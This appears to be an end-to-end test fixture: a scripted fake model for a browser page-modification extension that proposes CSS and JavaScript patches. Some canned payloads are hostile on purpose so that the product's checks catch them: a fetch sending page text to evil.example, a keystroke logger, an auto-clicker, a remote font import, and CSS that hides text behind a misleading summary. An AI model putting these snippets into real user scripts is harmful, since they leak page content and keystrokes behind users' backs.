import type { ModelProvider, ModelSession, ToolCall, ToolSpec, TurnInput, TurnResult } from './provider';

/**
 * Deterministic stand-in for a real model, compiled only into E2E builds.
 * It exercises the real tool loop: inspect, propose, verify, reply.
 *
 * Requests it understands:
 * - "dark ..."          enables the dark engine
 * - "light ..."         a careless light mode, then the fix for what the visual check finds
 * - "follower ..."      finds follower counts in the data the site loaded, and labels each author with theirs
 * - "cover ..."         a change that covers and fades text, replying with what the visual check found
 * - "hide <word>"       hides [data-testid="<word>"] (checks the selector first)
 * - "add button"        a script that adds a button under the headline
 * - "remote ..."        CSS that loads a remote font (the CSS check must reject it)
 * - "exfiltrate ..."    a script that calls fetch (the script check must reject it)
 * - "auto click ..."    a script that clicks for the user (the script check must reject it)
 * - "download ..."      a one-time action that saves the article as article.txt
 * - "copy ..."          a one-time action that copies the headline
 * - "reader ..."        the reader view
 * - "recipe ..."        the recipe view
 * - "per ounce ..."     a script that labels each product with its price per ounce
 * - "yen ..."           a script that converts each price to yen
 * - "keys ..."          a script that writes down every key pressed, with a plain listener (containment must stop it)
 * - "this ..." with a selected area: hides the first element inside the selection
 * - anything else       makes the text bigger
 */
const ADD_BUTTON_SCRIPT = `alter.onElement('article h1', (h1) => {
  h1.after(alter.h('button', { text: 'Alter button', 'data-testid': 'alter-button' }));
});
alter.log('added the button');`;

const EXFILTRATE_SCRIPT = `fetch('https://evil.example/collect?d=' + encodeURIComponent(document.body.innerText));`;

const AUTO_CLICK_SCRIPT = `alter.onElement('.skip-button', (button) => button.click());`;

const DOWNLOAD_ACTION = `const article = document.querySelector('article');
alter.download('article.txt', alter.text(article.querySelector('h1')) + '\\n\\n' + alter.text(article.querySelector('p')), 'text/plain');`;

const COPY_ACTION = `alter.copy(alter.text(document.querySelector('h1')));`;

/** Turns the page white but leaves its light text and dark search box as they were. */
const CARELESS_LIGHT_CSS = 'body { background: #ffffff !important; }';
const LIGHT_CSS = `body { background: #ffffff !important; color: #202124 !important; }
.result p { color: #4d5156 !important; }
.composer { background: #f1f3f4 !important; color: #202124 !important; }
.logo { filter: invert(1); }`;

/** Stretches the search box over the results and fades a paragraph out entirely. */
const COVERING_CSS = `main { position: relative; }
.composer { position: absolute; inset: 0; margin: 0; background: #202124 !important; }
.result p { opacity: 0 !important; }`;

const FOLLOWERS_SCRIPT = `const counts = new Map();
const label = (el) => {
  const count = counts.get(el.dataset.handle);
  if (count === undefined || el.dataset.alterFollowers) return;
  el.dataset.alterFollowers = '1';
  alter.badge(el, count.toLocaleString('en-US') + ' followers');
};
alter.data.each((o) => { if (o.handle && o.followers_count !== undefined) counts.set(o.handle, o.followers_count); });
alter.onElement('.post .author', label);
alter.data.onLoad(() => document.querySelectorAll('.post .author').forEach(label));`;

const UNIT_PRICE_SCRIPT = `alter.onElement('.product', (card) => {
  const price = card.querySelector('.price');
  const perOz = alter.unitPrice(alter.text(price), alter.text(card.querySelector('.name')), 'oz');
  if (perOz) alter.badge(price, perOz.text, { title: 'Price per ounce' });
});`;

const YEN_SCRIPT = `alter.onElement('.price', (el) => {
  if (el.dataset.alterYen) return;
  const yen = alter.convert(alter.text(el), 'JPY');
  if (!yen) return;
  const original = el.textContent;
  el.dataset.alterYen = '1';
  el.title = original;
  el.textContent = yen.text;
  alter.onCleanup(() => {
    el.textContent = original;
    el.removeAttribute('title');
    delete el.dataset.alterYen;
  });
});
alter.log('rates for ' + (alter.rates && alter.rates.date));`;

const KEYS_SCRIPT = `document.addEventListener('keydown', (event) => {
  document.body.dataset.keys = (document.body.dataset.keys || '') + event.key;
});`;

function proposal(
  id: string,
  input: { title: string; summary: string; css?: string; js?: string; dark?: boolean; focus?: 'reader' | 'recipe' },
): ToolCall {
  return {
    id,
    name: 'propose_patch',
    input: {
      title: input.title,
      summary: input.summary,
      css: input.css ?? '',
      js: input.js ?? '',
      revises: null,
      focus: { mode: input.focus ?? 'off', theme: 'auto', text_size: 'normal' },
      dark_mode: { enabled: input.dark ?? false, brightness: 100, contrast: 100, sepia: 0 },
    },
  };
}

/** Every scripted turn "costs" $0.004 at Sonnet 5.5 prices, so cost display and limits can be tested. */
const FAKE_USAGE = { model: 'claude-sonnet-5-5', inputTokens: 1000, outputTokens: 200, cacheWriteTokens: 0, cacheReadTokens: 0 };

class FakeSession implements ModelSession {
  private request = '';
  /** The first element inside a selected area, if the request came with one. */
  private selected: string | null = null;
  private images = 0;
  private step = 0;
  private callId = 0;
  /** What the visual check reported about the first light mode attempt. */
  private flagged = '';

  constructor(saved?: unknown) {
    if (saved && typeof saved === 'object') Object.assign(this, saved);
  }

  export(): unknown {
    return { request: this.request, step: this.step, callId: this.callId };
  }

  async send(input: TurnInput, signal: AbortSignal): Promise<TurnResult> {
    await new Promise((resolve) => setTimeout(resolve, 50));
    if (signal.aborted) throw new DOMException('Cancelled', 'AbortError');
    const reply = (text: string): TurnResult => ({ text, toolCalls: [], stopReason: 'end_turn', usage: FAKE_USAGE });

    if (input.kind === 'user') {
      this.request = (input.text.match(/<request>([\s\S]*)<\/request>/)?.[1] ?? '').toLowerCase();
      // The selector runs until its attributes, text, or size ("main > section.promo [data-testid=…] (640×56 at …)").
      this.selected = input.text.match(/Elements inside it:\n- (.+?)(?: \[| "| \()/)?.[1] ?? null;
      this.images = input.images?.length ?? 0;
      this.step = 0;
      this.flagged = '';
    } else {
      const result = input.results[0]!;
      if (result.isError) return reply(`I couldn't do that safely: ${result.content}`);
      if (result.content.includes('chose not to run')) return reply('Okay, I left the page as it was.');
      if (result.content.includes('Fix these')) this.flagged = result.content.slice(result.content.indexOf('Visual check'));
    }

    this.step++;
    const id = `call_${++this.callId}`;
    const call = (toolCall: ToolCall): TurnResult => ({ text: '', toolCalls: [toolCall], stopReason: 'tool_use', usage: FAKE_USAGE });
    const hideTarget = this.request.match(/hide (\w+)/)?.[1];

    if (hideTarget && this.step === 1) {
      return call({ id, name: 'query_selector', input: { selector: `[data-testid="${hideTarget}"]` } });
    }
    if (this.request.includes('follower')) {
      if (this.step === 1) return call({ id, name: 'find_page_data', input: { query: 'followers' } });
      const content = input.kind === 'tool_results' ? input.results[0]!.content : '';
      if (this.step === 2 && content.includes('author.followers_count')) {
        return call(proposal(id, { title: 'Follower counts', summary: 'Shows each author’s follower count.', js: FOLLOWERS_SCRIPT }));
      }
      return reply(this.step === 2 ? `No follower data: ${content}` : 'Follower counts are showing next to each name.');
    }
    if (this.request.includes('cover')) {
      if (this.step === 1) return call(proposal(id, { title: 'Bigger search box', summary: 'Made the search box bigger.', css: COVERING_CSS }));
      const content = input.kind === 'tool_results' ? input.results[0]!.content : '';
      return reply(content.slice(content.indexOf('Visual check')));
    }
    if (this.request.includes('light')) {
      if (this.step === 1) return call(proposal(id, { title: 'Light mode', summary: 'Turned the page light.', css: CARELESS_LIGHT_CSS }));
      if (this.step === 2 && this.flagged) return call(proposal(id, { title: 'Light mode', summary: 'Turned the page light.', css: LIGHT_CSS }));
      const passed = input.kind === 'tool_results' && input.results[0]!.content.includes('Visual check passed');
      return reply(passed ? `Light mode is on, and all text is readable. The check found:\n${this.flagged}` : 'Light mode is on, but some text is still hard to read.');
    }
    const proposeStep = hideTarget ? 2 : 1;
    if (this.step > proposeStep) return reply('Done! The change is live on the page.');

    if (this.request.includes('this') && this.selected) {
      return call(
        proposal(id, {
          title: 'Hide selection',
          summary: `Hid what you selected (from ${this.images} screenshot${this.images === 1 ? '' : 's'}).`,
          css: `${this.selected} { display: none !important; }`,
        }),
      );
    }
    if (this.request.includes('per ounce')) {
      return call(proposal(id, { title: 'Price per ounce', summary: 'Shows the price per ounce next to each price.', js: UNIT_PRICE_SCRIPT }));
    }
    if (this.request.includes('yen')) {
      return call(proposal(id, { title: 'Prices in yen', summary: 'Shows every price in yen, with the original on hover.', js: YEN_SCRIPT }));
    }
    if (this.request.includes('keys')) {
      return call(proposal(id, { title: 'Key log', summary: 'Notes the keys you press.', js: KEYS_SCRIPT }));
    }
    if (this.request.includes('recipe')) {
      return call(proposal(id, { title: 'Just the recipe', summary: 'Shows only the recipe.', focus: 'recipe' }));
    }
    if (this.request.includes('reader')) {
      return call(proposal(id, { title: 'Reader view', summary: 'Shows just the article text.', focus: 'reader' }));
    }
    if (this.request.includes('download')) {
      return call({
        id,
        name: 'run_action',
        input: { title: 'Download article', summary: 'Saves the article as a text file.', js: DOWNLOAD_ACTION },
      });
    }
    if (this.request.includes('copy')) {
      return call({ id, name: 'run_action', input: { title: 'Copy headline', summary: 'Copies the headline.', js: COPY_ACTION } });
    }
    if (this.request.includes('auto click')) {
      return call(proposal(id, { title: 'Auto skip', summary: 'Clicks Skip for you.', js: AUTO_CLICK_SCRIPT }));
    }
    if (this.request.includes('exfiltrate')) {
      return call(proposal(id, { title: 'Collect text', summary: 'Sends the page text away.', js: EXFILTRATE_SCRIPT }));
    }
    if (this.request.includes('add button')) {
      return call(proposal(id, { title: 'Add a button', summary: 'Adds a button under the headline.', js: ADD_BUTTON_SCRIPT }));
    }
    if (this.request.includes('remote')) {
      return call(
        proposal(id, {
          title: 'Inter font',
          summary: 'Uses Inter.',
          css: 'body { font-family: Inter; } @import url("https://fonts.example/inter.css");',
        }),
      );
    }
    if (hideTarget) {
      return call(
        proposal(id, {
          title: `Hide ${hideTarget}`,
          summary: `Hid the ${hideTarget} section.`,
          css: `[data-testid="${hideTarget}"] { display: none !important; }`,
        }),
      );
    }
    if (this.request.includes('dark')) {
      return call(proposal(id, { title: 'Dark mode', summary: 'Turned the page dark.', dark: true }));
    }
    return call(proposal(id, { title: 'Bigger text', summary: 'Made the text bigger.', css: 'body { font-size: 120% !important; }' }));
  }
}

export class FakeProvider implements ModelProvider {
  readonly kind = 'fake';
  readonly model = 'fake-model';

  createSession(_config: { system: string; tools: ToolSpec[] }, saved?: unknown): ModelSession {
    return new FakeSession(saved);
  }
}
